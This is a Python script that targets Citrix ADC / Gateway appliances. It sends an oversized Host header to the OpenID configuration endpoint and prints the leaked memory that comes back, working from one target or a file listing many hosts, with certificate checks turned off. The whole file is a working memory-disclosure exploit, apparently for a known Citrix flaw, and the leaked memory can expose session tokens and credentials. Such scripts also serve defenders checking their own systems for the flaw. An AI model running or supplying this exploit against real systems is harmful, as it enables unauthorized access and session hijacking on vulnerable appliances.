#!/usr/bin/env python3

import sys
import requests
import urllib3
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument('--target', help='The Citrix ADC / Gateway target, excluding the protocol (e.g. 192.168.1.200)')
parser.add_argument("-p", "--port", help = "Target port", default = 443)
parser.add_argument('--file', help='Path to a text file containing a list of hosts, one per line')
args = parser.parse_args()

if args.target is None and args.file is None:
    print('Either a target or a file containing hosts must be provided (e.g., --target 192.168.1.200 or --file hosts.txt)')
    sys.exit(0)

def test_host(hostname, port):
    headers = {
        "Host": "a"*24576
    }
    r = requests.get(f"https://{hostname}:{port}/oauth/idp/.well-known/openid-configuration", headers=headers, verify=False, timeout=10)
    if r.status_code == 200:
        print(f"--- Dumped Memory for {hostname}:{port} ---")
        print(r.text[131050:])
        print("---      End      ---")
    else:
        print(f"Could not dump memory for {hostname}:{port}")

if args.target:
    hostname = args.target
    port = int(args.port)
    test_host(hostname, port)

if args.file:
    with open(args.file, 'r') as file:
        for line in file:
            hostname = line.strip()
            port = int(args.port)
            test_host(hostname, port)
